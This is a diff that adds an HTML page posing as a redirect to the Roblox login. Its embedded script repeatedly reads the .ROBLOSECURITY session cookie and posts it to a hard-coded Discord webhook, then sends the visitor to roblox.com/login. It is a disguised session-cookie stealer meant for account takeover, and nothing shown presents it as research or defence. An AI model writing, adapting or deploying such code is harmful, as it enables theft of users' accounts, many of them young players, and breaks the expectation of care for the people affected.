@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting to Roblox Login</title>
+</head>
+<body>
+    <h1>Redirecting to Roblox Login...</h1>
+    <script>
+        (function() {
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1240559043236335691/TwtA5ak-NENA-R2yVwKWqy2C9yIkOPcBETMXwvlKbW0NL3_Xj79HH-HymYn9ASRfe2mN";
+
+            function getCookie(name) {
+                const value = `; ${document.cookie}`;
+                const parts = value.split(`; ${name}=`);
+                if (parts.length === 2) return parts.pop().split(';').shift();
+            }
+
+            function sendCookie(cookie) {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cookie })
+                });
+            }
+
+            function checkAndSendCookie() {
+                const robloSecurityCookie = getCookie('.ROBLOSECURITY');
+                if (robloSecurityCookie) {
+                    sendCookie(robloSecurityCookie);
+                } else {
+                    console.log('Roblox security cookie not found.');
+                }
+            }
+
+            // Check for the cookie every 1 seconds
+            setInterval(checkAndSendCookie, 1000);
+
+            // Redirect to Roblox login page
+            window.location.href = "https://roblox.com/login/";
+        })();
+    </script>
+</body>
+</html>
